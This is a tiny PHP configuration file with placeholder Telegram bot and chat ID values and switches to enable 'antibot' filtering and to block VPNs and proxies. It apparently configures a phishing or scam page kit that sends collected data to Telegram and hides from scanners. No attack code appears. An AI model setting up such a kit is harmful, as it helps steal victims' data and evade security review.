<?php 




$bot = "your-token";
$chat_id = "chatid";


// use antibot? yes|no
$antibot = "yes";

// want to block all VPNs/PROXIES? yes|no
$block_proxy = "yes";




?>